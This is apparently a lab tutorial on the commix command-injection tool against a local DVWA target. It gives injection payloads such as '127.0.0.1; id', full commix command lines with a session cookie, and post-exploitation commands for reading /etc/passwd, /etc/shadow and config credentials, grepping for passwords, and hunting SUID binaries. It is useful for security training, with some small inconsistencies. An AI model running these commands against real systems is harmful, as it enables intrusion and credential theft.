# Commix


## What is commix?





# Commix Methodology

- In this i used target with `DVWA`: http://192.168.100.97:8080/vulnerabilities/exec/
<img width="808" height="655" alt="image" src="https://github.com/user-attachments/assets/e2a439f3-9698-4600-876f-03ee607ace68" />


## 1. Check Cookie:
### Browser Developer Tools
- Check `Cookie`, first go to our target Press `F12` -> Go to `Network` tab:
<img width="1918" height="536" alt="image" src="https://github.com/user-attachments/assets/e707a042-87dc-4168-88c4-a5f9b9957158" />

<img width="1918" height="737" alt="image" src="https://github.com/user-attachments/assets/3ebc4f71-f5e7-4a44-8838-02bb4d38a319" />

- So in this i found `Cookie`: `52f23l16nl2mk6ejrbvb6b1vg7`



### Use JavaScript Console
- Press `F12` -> `Console` tab and type this:
````
document.cookie
````
<img width="1907" height="241" alt="image" src="https://github.com/user-attachments/assets/e1baf6e9-1ae9-427e-9e57-60d30f56fdb0" />


### Use cURL
````
curl -I "http://192.168.100.97:8080/vulnerabilities/exec/" -H "Cookie: security=low" --cookie-jar cookies.txt
````
<img width="1507" height="300" alt="image" src="https://github.com/user-attachments/assets/8cf7b7d5-8252-43ac-87b7-2c503d6b24c1" />

- Check `Cookies`
````
cat cookies.txt
````
<img width="1217" height="199" alt="image" src="https://github.com/user-attachments/assets/488246ad-8572-4594-ab9f-5a601d9b2675" />


### Check with Burp Suite 
- First open our ``Burp`` -> open `Browser`:
<img width="1918" height="803" alt="image" src="https://github.com/user-attachments/assets/c87ddf40-e4d5-4725-956c-f327bf3a3af1" />

- Type our target `URL` to those browser, and after go back to our `Burp`:
 <img width="1916" height="718" alt="image" src="https://github.com/user-attachments/assets/5dfea94f-8ddb-4eb2-9e6e-82c563339d77" />

<img width="1918" height="812" alt="image" src="https://github.com/user-attachments/assets/aeac6636-48eb-4d39-bfc2-8f8e17145c63" />


---
### Testing
````
127.0.0.1 whoami
````
<img width="807" height="433" alt="image" src="https://github.com/user-attachments/assets/3e9f179b-5e8d-467b-8550-81b06c332095" />

<img width="807" height="641" alt="image" src="https://github.com/user-attachments/assets/f50b1b6f-4f0a-41b4-8f8e-edaf2a0f1df7" />


### More Manual Tests
````
127.0.0.1; pwd
````
<img width="797" height="438" alt="image" src="https://github.com/user-attachments/assets/9cf585f8-1727-4223-aee3-eb9939f71834" />

````
127.0.0.1; ls -la
````
<img width="803" height="443" alt="image" src="https://github.com/user-attachments/assets/2c4e848b-74a5-4005-b400-f832107c3108" />

````
127.0.0.1; id
````
<img width="805" height="437" alt="image" src="https://github.com/user-attachments/assets/ff2b713e-b326-4103-b87b-fcee280c68b1" />

````
127.0.0.1; uname -a
````
<img width="1102" height="441" alt="image" src="https://github.com/user-attachments/assets/14ee0178-4876-40d9-9982-7a3e8bba3372" />


---



## 2. Installation

### Install in Kali
````
sudo apt install commix
````
<img width="1369" height="722" alt="image" src="https://github.com/user-attachments/assets/08f1fcee-23e7-4f9f-b3e7-727d03df42d0" />

````
commix --v
````
<img width="322" height="118" alt="image" src="https://github.com/user-attachments/assets/6d1273c7-e618-4a6c-9bc6-7aac0a8bae5b" />


### Install via Github
````
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
````
<img width="894" height="812" alt="image" src="https://github.com/user-attachments/assets/f26e7296-b46a-426f-82b2-637067b2a6a0" />

----


## 3. Usage Options

### Get help
````
python3 commix.py --help
````
<img width="803" height="798" alt="image" src="https://github.com/user-attachments/assets/de8ebafd-9e29-4fc9-9adc-1a2b311d5180" />

---

### Usage Options

#### General 
| Option               | Meaning / Description                                     |
| -------------------- | --------------------------------------------------------- |
| `-h, --help`         | Show help and exit.                                       |
| `-v VERBOSE`         | Verbosity level (0–4). Default: 0.                        |
| `--install`          | Install commix to your system.                            |
| `--version`          | Show version number and exit.                             |
| `--update`           | Check for updates (apply if any) and exit.                |
| `--output-dir=OUT..` | Set custom output directory path.                         |
| `-s SESSION_FILE`    | Load session from a stored (.sqlite) file.                |
| `--flush-session`    | Flush session files for current target.                   |
| `--ignore-session`   | Ignore results stored in session file.                    |
| `-t TRAFFIC_FILE`    | Log all HTTP traffic into a textual file.                 |
| `--time-limit=TIM..` | Run with a time limit in seconds (e.g. 3600).             |
| `--batch`            | Never ask for user input; use default behaviour.          |
| `--skip-heuristics`  | Skip heuristic detection for code injection.              |
| `--codec=CODEC`      | Force codec for character encoding (e.g. `ascii`).        |
| `--charset=CHARSET`  | Time-related injection charset (e.g. `0123456789abcdef`). |
| `--check-internet`   | Check internet connection before assessing the target.    |
| `--answers=ANSWERS`  | Set predefined answers (e.g. `quit=N,follow=N`).          |


#### Target
| Option               | Meaning / Description                                        |
| -------------------- | ------------------------------------------------------------ |
| `-u URL, --url=URL`  | Target URL (required to define target).                      |
| `--url-reload`       | Reload target URL after command execution.                   |
| `-l LOGFILE`         | Parse target from HTTP proxy log file.                       |
| `-m BULKFILE`        | Scan multiple targets listed in a file.                      |
| `-r REQUESTFILE`     | Load HTTP request from a file.                               |
| `--crawl=CRAWLDEPTH` | Crawl the website starting from the target URL (Default: 1). |
| `--crawl-exclude=..` | Regexp to exclude pages from crawling (e.g. `logout`).       |
| `-x SITEMAP_URL`     | Parse target(s) from remote sitemap(.xml) file.              |
| `--method=METHOD`    | Force usage of given HTTP method (e.g. `PUT`).               |


#### Request
| Option                       | Meaning / Description                                 |
| ---------------------------- | ----------------------------------------------------- |
| `-d DATA, --data=..`         | Data string to be sent through POST.                  |
| `--host=HOST`                | HTTP Host header.                                     |
| `--referer=REFERER`          | HTTP Referer header.                                  |
| `--user-agent=AGENT`         | HTTP User-Agent header.                               |
| `--random-agent`             | Use a randomly selected User-Agent header.            |
| `--param-del=PDEL`           | Character for splitting parameter values.             |
| `--cookie=COOKIE`            | HTTP Cookie header.                                   |
| `--cookie-del=CDEL`          | Character for splitting cookie values.                |
| `--http1.0`                  | Force requests to use HTTP/1.0 protocol.              |
| `-H HEADER, --header=HEADER` | Extra header (e.g. `X-Forwarded-For: 127.0.0.1`).     |
| `--headers=HEADERS`          | Extra headers (multi-line string).                    |
| `--proxy=PROXY`              | Use a proxy to connect to the target URL.             |
| `--tor`                      | Use the Tor network.                                  |
| `--tor-port=TOR_PORT`        | Set Tor proxy port (Default: 8118).                   |
| `--tor-check`                | Check to see if Tor is used properly.                 |
| `--auth-url=AUTH_URL`        | Login panel URL.                                      |
| `--auth-data=AUTH..`         | Login parameters and data.                            |
| `--auth-type=AUTH..`         | HTTP authentication type (Basic, Digest, Bearer).     |
| `--auth-cred=AUTH..`         | HTTP authentication credentials (e.g. `admin:admin`). |
| `--abort-code=ABORT_CODES`   | Abort on HTTP error code(s) (e.g. `401`).             |
| `--ignore-code=IGNORE_CODES` | Ignore HTTP error code(s) (e.g. `401`).               |
| `--force-ssl`                | Force usage of SSL/HTTPS.                             |
| `--ignore-proxy`             | Ignore system default proxy settings.                 |
| `--ignore-redirects`         | Ignore redirection attempts.                          |
| `--timeout=TIMEOUT`          | Seconds to wait before timeout (Default: 30).         |
| `--retries=RETRIES`          | Retries when connection times out (Default: 3).       |
| `--drop-set-cookie`          | Ignore `Set-Cookie` header from response.             |


#### Enumeration
| Option           | Meaning / Description                       |
| ---------------- | ------------------------------------------- |
| `--all`          | Retrieve everything (enumeration).          |
| `--current-user` | Retrieve current user name.                 |
| `--hostname`     | Retrieve current hostname.                  |
| `--is-root`      | Check if current user has root privileges.  |
| `--is-admin`     | Check if current user has admin privileges. |
| `--sys-info`     | Retrieve system information.                |
| `--users`        | Retrieve system users.                      |
| `--passwords`    | Retrieve system users password hashes.      |
| `--privileges`   | Retrieve system users privileges.           |
| `--ps-version`   | Retrieve PowerShell's version number.       |



#### File Access
| Option                 | Meaning / Description                        |
| ---------------------- | -------------------------------------------- |
| `--file-read=FILE..`   | Read a file from the target host.            |
| `--file-write=FILE..`  | Write to a file on the target host.          |
| `--file-upload=FILE..` | Upload a file to the target host.            |
| `--file-dest=FILE..`   | Host's absolute filepath to write/upload to. |


#### Modules
| Option         | Meaning / Description                     |
| -------------- | ----------------------------------------- |
| `--shellshock` | Enable the `shellshock` injection module. |


#### Injection
| Option                    | Meaning / Description                                              |
| ------------------------- | ------------------------------------------------------------------ |
| `-p TEST_PARAMETER`       | Testable parameter(s).                                             |
| `--skip=SKIP_PARAMS`      | Skip testing for given parameter(s).                               |
| `--suffix=SUFFIX`         | Injection payload suffix string.                                   |
| `--prefix=PREFIX`         | Injection payload prefix string.                                   |
| `--technique=TECH`        | Specify injection technique(s) to use.                             |
| `--skip-technique..`      | Specify injection technique(s) to skip.                            |
| `--maxlen=MAXLEN`         | Max length of output for time-related techniques (Default: 10000). |
| `--delay=DELAY`           | Seconds to delay between each HTTP request.                        |
| `--time-sec=TIMESEC`      | Seconds to delay the OS response.                                  |
| `--tmp-path=TMP_PATH`     | Absolute path of web server's temp directory.                      |
| `--web-root=WEB_ROOT`     | Web server document root (e.g. `/var/www`).                        |
| `--alter-shell=ALT_SHELL` | Use an alternative OS shell (e.g. `Python`).                       |
| `--os-cmd=OS_CMD`         | Execute a single operating system command.                         |
| `--os=OS`                 | Force back-end OS (e.g. `Windows` or `Unix`).                      |
| `--tamper=TAMPER`         | Use given script(s) for tampering injection data.                  |
| `--msf-path=MSF_PATH`     | Set local path where Metasploit is installed.                      |


#### Detection
| Option               | Meaning / Description                                   |
| -------------------- | ------------------------------------------------------- |
| `--level=LEVEL`      | Level of tests to perform (1–3, Default: 1).            |
| `--skip-calc`        | Skip the mathematic calculation during detection phase. |
| `--skip-empty`       | Skip testing parameter(s) with empty values.            |
| `--failed-tries=F..` | Set number of failed tries in file-based technique.     |
| `--smart`            | Perform thorough tests only if positive heuristic(s).   |


#### Miscellaneous
| Option               | Meaning / Description                                 |
| -------------------- | ----------------------------------------------------- |
| `--ignore-depende..` | Ignore required third-party library dependencies.     |
| `--list-tampers`     | Display list of available tamper scripts.             |
| `--alert=ALERT`      | Run host OS command(s) when injection point is found. |
| `--no-logging`       | Disable logging to a file.                            |
| `--purge`            | Safely remove all content from commix data directory. |
| `--skip-waf`         | Skip heuristic detection of WAF/IPS protection.       |
| `--mobile`           | Imitate smartphone through HTTP User-Agent header.    |
| `--offline`          | Work in offline mode.                                 |
| `--wizard`           | Simple wizard interface for beginner users.           |
| `--disable-coloring` | Disable console output coloring.                      |


----








## 4. BASIC COMMIX SCAN

- Use `burb` to see our `ip`:
<img width="1918" height="757" alt="image" src="https://github.com/user-attachments/assets/693d04c5-8c8c-4e03-aab8-128231a5b5c0" />

- In `Browser` type `test` -> `submit`:
<img width="1133" height="604" alt="image" src="https://github.com/user-attachments/assets/0a87c823-62e3-4744-8cf7-3602203cd27a" />

<img width="1177" height="583" alt="image" src="https://github.com/user-attachments/assets/efc74b4f-4fe7-4a5e-b03c-0ad4f0cb0e01" />



### Basic Scan
<img width="1917" height="772" alt="image" src="https://github.com/user-attachments/assets/9b8a6bd2-fff6-41c4-898c-019512647b71" />

- So in this in `Ping a Device` are `ip`.


````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit" --cookie="PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --batch
````
<img width="1913" height="692" alt="image" src="https://github.com/user-attachments/assets/ccb0608c-6ee5-439b-aee6-80ade9c6bdcf" />


###  Command that we can use with this shell

#### System Information Commands
| Command               | Meaning / Example output                                                                                                                   |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| `whoami`              | Shows current user — e.g. `www-data`.                                                                                                      |
| `id`                  | Full user/group info — e.g. `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.                                                       |
| `uname -a`            | Kernel and system info — OS kernel version and architecture (e.g. `Linux 9db2af0e120b 6.6.87.2-microsoft-standard-WSL2 x86_64 GNU/Linux`). |
| `hostname`            | Server hostname — e.g. `dvwa` or `9db2af0e120b`.                                                                                           |
| `cat /etc/os-release` | Distribution details (name, version, ID) — e.g. shows `NAME="Ubuntu"`, `VERSION="20.04.1 LTS (Focal Fossa)"`.                              |
| `lsb_release -a`      | Ubuntu/Debian release information — e.g. `Distributor ID: Ubuntu`, `Description: Ubuntu 20.04.1 LTS`, `Release: 20.04`.                    |


#### 2. File Exploration & Reading
| Command                                        | Purpose / Example                                                                          |
| ---------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `pwd`                                          | Print current directory — e.g. `/var/www/html/vulnerabilities/exec`.                       |
| `ls -la`                                       | List all files in current directory (including hidden files).                              |
| `ls -la /var/www/html`                         | List files in the web root.                                                                |
| `find / -type f -name "*.php" 2>/dev/null`     | Find PHP files across the filesystem (suppress permission errors).                         |
| `find / -type f -name "config*" 2>/dev/null`   | Find files whose name starts with `config`.                                                |
| `cat /var/www/html/config/config.inc.php`      | Display config file contents (may contain DB credentials).                                 |
| `cat /etc/passwd`                              | Show system user accounts.                                                                 |
| `cat /etc/shadow`                              | Show password hashes (usually requires root — will fail as non-root).                      |
| `grep -r "password" /var/www/html 2>/dev/null` | Recursively search web files for the string `password`.                                    |
| **Note**                                       | Reading configuration files can reveal credentials — protect and rotate any secrets found. |




#### 3. Network Reconnaissance
| Command                     | Purpose / Example                                                                                                   |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| `ip addr` **or** `ifconfig` | Show network interfaces and IP addresses.                                                                           |
| `netstat -tlnp`             | Show listening TCP ports with associated processes (`-t` TCP, `-l` listening, `-n` numeric, `-p` show PID/program). |
| `ping -c 1 8.8.8.8`         | Send one ICMP echo to test basic network connectivity.                                                              |
| `curl ifconfig.me`          | Retrieve the host's external IP address (if outbound access allowed).                                               |
| `nc -zv 192.168.100.1 22`   | (netcat) Probe port 22 on another host to see if SSH is open (`-z` scan, `-v` verbose).                             |
| `telnet 192.168.100.1 80`   | Try connecting to port 80 on another machine to test HTTP connectivity.                                             |
| **Note**                    | Use network probes only in isolated labs or with permission; excessive scanning can trigger alarms.                 |


#### 4. Privilege Escalation
| Command                                  | Purpose / Example                                                                                                                                                                                           |
| ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sudo -l`                                | List allowed `sudo` commands for current user (checks for misconfigurations).                                                                                                                               |
| `find / -perm -4000 -type f 2>/dev/null` | Find SUID binaries (files with the SUID bit set).                                                                                                                                                           |
| `cat /etc/crontab`                       | View scheduled cron tasks (may reveal scripts run as root).                                                                                                                                                 |
| `env`                                    | Show environment variables (may leak configuration or secrets).                                                                                                                                             |
| `history`                                | Show shell command history (if accessible).                                                                                                                                                                 |
| **Caveat**                               | `www-data` is typically low-privilege. In a proper DVWA lab you’ll usually remain `www-data`; privilege escalation requires additional flaws and must only be pursued in authorized, isolated environments. |


- To exit the shell: Type `exit` or `quit`.

----



## 5. ADVANCED PARAMETERS - ONE BY ONE

### 1. Detection Level Parameters:

#### Level 1
````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit" --cookie="PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --level=1 --batch
````
<img width="1909" height="745" alt="image" src="https://github.com/user-attachments/assets/8906c806-9220-49ff-9559-a619b6646688" />


#### Level 2
````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit" --cookie="PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --level=2 --batch
````




#### Level 3
````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit" --cookie="PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --level=3 --batch
````



#### Level 4 - 5
````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit" --cookie="PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --level=5 --batch
````


---


### Technique Parameters:

#### Boolean-based Technique:
````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit" --cookie="PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --technique="boolean" --batch
````



#### Time-based Technique:
````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit" --cookie="PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --technique="time-based" --time-sec=5 --batch
````



#### Stacked Queries Technique:
````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit" --cookie="PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --technique="stacked" --batch
````



### 3. OS Specific Parameters:

#### Specify Linux Target:
````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit" --cookie="PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --os="linux" --batch
````


#### Specify Windows Target:
````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit" --cookie="PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --os="windows" --batch
````



#### Custom OS Command:
````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit" --cookie="PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --os-cmd="whoami" --batch
````


---























































